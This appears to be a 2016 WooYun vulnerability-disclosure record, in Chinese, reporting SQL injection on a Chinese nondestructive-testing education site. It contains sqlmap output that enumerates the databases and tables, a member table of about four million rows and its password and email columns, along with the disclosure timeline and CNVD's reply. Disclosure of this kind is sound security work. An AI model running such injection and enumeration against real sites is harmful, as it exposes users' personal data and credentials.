{"id": 75041, "wybug_id": "wooyun-2016-0168730", "wybug_title": "中国无损检测教育网存在SQL注入400+W数据泄漏", "wybug_corp": "中国无损检测教育网", "wybug_author": "SnailPP", "wybug_date": "2016-01-13 16:52", "wybug_open_date": "2016-02-27 11:49", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-02-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-27：\t细节向公众公开  简要描述：  详细说明：  308张表，400+W数据泄漏   漏洞证明：  http://**.**.**.**/index.php/Material/show/id/215  一个URL重写，存在注入[19:46:50] [INFO] fetching current usercurrent user:    'root@localhost'Database: wusun[308 tables]+----------------------------------------------+| nk_ad                                        || nk_admin                                     || nk_adposition                                || nk_brand                                     || nk_column                                    || nk_discuss                                   || nk_down                                      || nk_downcate                                  || nk_download                                  || nk_email                                     || nk_friendlink                                || nk_hotkey                                    || nk_limit                                     || nk_linknews                                  || nk_logindata                                 || nk_message                                   || nk_news                                      || nk_newscate                                  || nk_note                                      || nk_photo                                     || nk_photocate                                 || nk_piccate                                   || nk_picphoto                                  || nk_picture                                   || nk_record                                    || nk_seo                                       || nk_usermsg                                   || nk_vote                                      || nk_voteoption                                || pre_common_addon                             || pre_common_admincp_cmenu                     || pre_common_admincp_group                     || pre_common_admincp_member                    || pre_common_admincp_perm                      || pre_common_admincp_session                   || pre_common_admingroup                        || pre_common_adminnote                         || pre_common_advertisement                     || pre_common_advertisement_custom              || pre_common_banned                            || pre_common_block                             || pre_common_block_favorite                    || pre_common_block_item                        || pre_common_block_item_data                   || pre_common_block_permission                  || pre_common_block_pic                         || pre_common_block_style                       || pre_common_block_xml                         || pre_common_cache                             || pre_common_card                              || pre_common_card_log                          || pre_common_card_type                         || pre_common_connect_guest                     || pre_common_credit_log                        || pre_common_credit_rule                       || pre_common_credit_rule_log                   || pre_common_credit_rule_log_field             || pre_common_cron                              || pre_common_district                          || pre_common_diy_data                          || pre_common_domain                            || pre_common_failedlogin                       || pre_common_friendlink                        || pre_common_grouppm                           || pre_common_invite                            || pre_common_magic                             || pre_common_magiclog                          || pre_common_mailcron                          || pre_common_mailqueue                         || pre_common_member                            || pre_common_member_action_log                 || pre_common_member_connect                    || pre_common_member_count                      || pre_common_member_crime                      || pre_common_member_field_forum                || pre_common_member_field_home                 || pre_common_member_grouppm                    || pre_common_member_log                        || pre_common_member_magic                      || pre_common_member_medal                      || pre_common_member_profile                    || pre_common_member_profile_setting            || pre_common_member_security                   || pre_common_member_stat_field                 || pre_common_member_stat_fieldcache            || pre_common_member_stat_search                || pre_common_member_stat_searchcache           || pre_common_member_status                     || pre_common_member_validate                   || pre_common_member_verify                     || pre_common_member_verify_info                || pre_common_moderate                          || pre_common_myapp                             || pre_common_myinvite                          || pre_common_mytask                            || pre_common_nav                               || pre_common_onlinetime                        || pre_common_patch                             || pre_common_plugin                            || pre_common_pluginvar                         || pre_common_process                           || pre_common_regip                             || pre_common_relatedlink                       || pre_common_report                            || pre_common_searchindex                       || pre_common_secquestion                       || pre_common_session                           || pre_common_setting                           || pre_common_smiley                            || pre_common_sphinxcounter                     || pre_common_stat                              || pre_common_statuser                          || pre_common_style                             || pre_common_stylevar                          || pre_common_syscache                          || pre_common_tag                               || pre_common_tagitem                           || pre_common_task                              || pre_common_taskvar                           || pre_common_template                          || pre_common_template_block                    || pre_common_template_permission               || pre_common_uin_black                         || pre_common_usergroup                         || pre_common_usergroup_field                   || pre_common_word                              || pre_common_word_type                         || pre_connect_disktask                         || pre_connect_feedlog                          || pre_connect_memberbindlog                    || pre_connect_tlog                             || pre_connect_tthreadlog                       || pre_forum_access                             || pre_forum_activity                           || pre_forum_activityapply                      || pre_forum_announcement                       || pre_forum_attachment                         || pre_forum_attachment_0                       || pre_forum_attachment_1                       || pre_forum_attachment_2                       || pre_forum_attachment_3                       || pre_forum_attachment_4                       || pre_forum_attachment_5                       || pre_forum_attachment_6                       || pre_forum_attachment_7                       || pre_forum_attachment_8                       || pre_forum_attachment_9                       || pre_forum_attachment_exif                    || pre_forum_attachment_unused                  || pre_forum_attachtype                         || pre_forum_bbcode                             || pre_forum_collection                         || pre_forum_collectioncomment                  || pre_forum_collectionfollow                   || pre_forum_collectioninvite                   || pre_forum_collectionrelated                  || pre_forum_collectionteamworker               || pre_forum_collectionthread                   || pre_forum_creditslog                         || pre_forum_debate                             || pre_forum_debatepost                         || pre_forum_faq                                || pre_forum_forum                              || pre_forum_forum_threadtable                  || pre_forum_forumfield                         || pre_forum_forumrecommend                     || pre_forum_groupcreditslog                    || pre_forum_groupfield                         || pre_forum_groupinvite                        || pre_forum_grouplevel                         || pre_forum_groupranking                       || pre_forum_groupuser                          || pre_forum_imagetype                          || pre_forum_medal                              || pre_forum_medallog                           || pre_forum_memberrecommend                    || pre_forum_moderator                          || pre_forum_modwork                            || pre_forum_onlinelist                         || pre_forum_order                              || pre_forum_poll                               || pre_forum_polloption                         || pre_forum_pollvoter                          || pre_forum_post                               || pre_forum_post_location                      || pre_forum_post_moderate                      || pre_forum_post_tableid                       || pre_forum_postcache                          || pre_forum_postcomment                        || pre_forum_postlog                            || pre_forum_postposition                       || pre_forum_poststick                          || pre_forum_promotion                          || pre_forum_ratelog                            || pre_forum_relatedthread                      || pre_forum_replycredit                        || pre_forum_rsscache                           || pre_forum_spacecache                         || pre_forum_statlog                            || pre_forum_thread                             || pre_forum_thread_moderate                    || pre_forum_threadaddviews                     || pre_forum_threadclass                        || pre_forum_threadclosed                       || pre_forum_threaddisablepos                   || pre_forum_threadimage                        || pre_forum_threadlog                          || pre_forum_threadmod                          || pre_forum_threadpartake                      || pre_forum_threadpreview                      || pre_forum_threadrush                         || pre_forum_threadtype                         || pre_forum_trade                              || pre_forum_tradecomment                       || pre_forum_tradelog                           || pre_forum_typeoption                         || pre_forum_typeoptionvar                      || pre_forum_typevar                            || pre_forum_warning                            || pre_home_album                               || pre_home_album_category                      || pre_home_appcreditlog                        || pre_home_blacklist                           || pre_home_blog                                || pre_home_blog_category                       || pre_home_blog_moderate                       || pre_home_blogfield                           || pre_home_class                               || pre_home_click                               || pre_home_clickuser                           || pre_home_comment                             || pre_home_comment_moderate                    || pre_home_docomment                           || pre_home_doing                               || pre_home_doing_moderate                      || pre_home_favorite                            || pre_home_feed                                || pre_home_feed_app                            || pre_home_follow                              || pre_home_follow_feed                         || pre_home_follow_feed_archiver                || pre_home_friend                              || pre_home_friend_request                      || pre_home_friendlog                           || pre_home_notification                        || pre_home_pic                                 || pre_home_pic_moderate                        || pre_home_picfield                            || pre_home_poke                                || pre_home_pokearchive                         || pre_home_share                               || pre_home_share_moderate                      || pre_home_show                                || pre_home_specialuser                         || pre_home_userapp                             || pre_home_userappfield                        || pre_home_viewlog                             || pre_home_visitor                             || pre_myrepeats                                || pre_portal_article_content                   || pre_portal_article_count                     || pre_portal_article_moderate                  || pre_portal_article_related                   || pre_portal_article_title                     || pre_portal_article_trash                     || pre_portal_attachment                        || pre_portal_category                          || pre_portal_category_permission               || pre_portal_comment                           || pre_portal_comment_moderate                  || pre_portal_rsscache                          || pre_portal_topic                             || pre_portal_topic_pic                         || pre_security_evilpost                        || pre_security_eviluser                        || pre_security_failedlog                       || pre_ucenter_admins                           || pre_ucenter_applications                     || pre_ucenter_badwords                         || pre_ucenter_domains                          || pre_ucenter_failedlogins                     || pre_ucenter_feeds                            || pre_ucenter_friends                          || pre_ucenter_mailqueue                        || pre_ucenter_memberfields                     || pre_ucenter_members                          || pre_ucenter_mergemembers                     || pre_ucenter_newpm                            || pre_ucenter_notelist                         || pre_ucenter_pm_indexes                       || pre_ucenter_pm_lists                         || pre_ucenter_pm_members                       || pre_ucenter_pm_messages_0                    || pre_ucenter_pm_messages_1                    || pre_ucenter_pm_messages_2                    || pre_ucenter_pm_messages_3                    || pre_ucenter_pm_messages_4                    || pre_ucenter_pm_messages_5                    || pre_ucenter_pm_messages_6                    || pre_ucenter_pm_messages_7                    || pre_ucenter_pm_messages_8                    || pre_ucenter_pm_messages_9                    || pre_ucenter_pms                              || pre_ucenter_protectedmembers                 || pre_ucenter_settings                         || pre_ucenter_sqlcache                         || pre_ucenter_tags                             || pre_ucenter_vars                             |+----------------------------------------------+Database: performance_schema[17 tables]+----------------------------------------------+| cond_instances                               || events_waits_current                         || events_waits_history                         || events_waits_history_long                    || events_waits_summary_by_instance             || events_waits_summary_by_thread_by_event_name || events_waits_summary_global_by_event_name    || file_instances                               || file_summary_by_event_name                   || file_summary_by_instance                     || mutex_instances                              || performance_timers                           || rwlock_instances                             || setup_consumers                              || setup_instruments                            || setup_timers                                 || threads                                      |+----------------------------------------------+Database: information_schema[37 tables]+----------------------------------------------+| CHARACTER_SETS                               || COLLATIONS                                   || COLLATION_CHARACTER_SET_APPLICABILITY        || COLUMNS                                      || COLUMN_PRIVILEGES                            || ENGINES                                      || EVENTS                                       || FILES                                        || GLOBAL_STATUS                                || GLOBAL_VARIABLES                             || INNODB_CMP                                   || INNODB_CMPMEM                                || INNODB_CMPMEM_RESET                          || INNODB_CMP_RESET                             || INNODB_LOCKS                                 || INNODB_LOCK_WAITS                            || INNODB_TRX                                   || KEY_COLUMN_USAGE                             || PARAMETERS                                   || PARTITIONS                                   || PLUGINS                                      || PROCESSLIST                                  || PROFILING                                    || REFERENTIAL_CONSTRAINTS                      || ROUTINES                                     || SCHEMATA                                     || SCHEMA_PRIVILEGES                            || SESSION_STATUS                               || SESSION_VARIABLES                            || STATISTICS                                   || TABLES                                       || TABLESPACES                                  || TABLE_CONSTRAINTS                            || TABLE_PRIVILEGES                             || TRIGGERS                                     || USER_PRIVILEGES                              || VIEWS                                        |+----------------------------------------------+Database: mysql[24 tables]+----------------------------------------------+| columns_priv                                 || db                                           || event                                        || func                                         || general_log                                  || help_category                                || help_keyword                                 || help_relation                                || help_topic                                   || host                                         || ndb_binlog_index                             || plugin                                       || proc                                         || procs_priv                                   || proxies_priv                                 || servers                                      || slow_log                                     || tables_priv                                  || time_zone                                    || time_zone_leap_second                        || time_zone_name                               || time_zone_transition                         || time_zone_transition_type                    || user                                         |+----------------------------------------------+找了个存放用户信息的表，发现400+W数据Database: wusun+-------------------+---------+| Table             | Entries |+-------------------+---------+| pre_common_member | 4077262 |+-------------------+---------+Database: wusunTable: pre_common_member[22 columns]+--------------------+-----------------------+| Column             | Type                  |+--------------------+-----------------------+| accessmasks        | tinyint(1)            || adminid            | tinyint(1)            || allowadmincp       | tinyint(1)            || avatarstatus       | tinyint(1)            || conisbind          | tinyint(1) unsigned   || credits            | int(10)               || email              | char(40)              || emailstatus        | tinyint(1)            || extgroupids        | char(20)              || groupexpiry        | int(10) unsigned      || groupid            | smallint(6) unsigned  || newpm              | smallint(6) unsigned  || newprompt          | smallint(6) unsigned  || notifysound        | tinyint(1)            || onlyacceptfriendpm | tinyint(1)            || password           | char(32)              || regdate            | int(10) unsigned      || status             | tinyint(1)            || timeoffset         | char(4)               || uid                | mediumint(8) unsigned || username           | char(15)              || videophotostatus   | tinyint(1)            |+--------------------+-----------------------+\n\n后面就没进一步的探索了,还算上其他表的数据可能就不止400W了。。   修复方案：  严格过滤用户输入   版权声明：转载请注明来源 SnailPP@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2016-01-15 17:51 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT向教育网应急组织通报,由其后续协调网站管理单位处置. 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}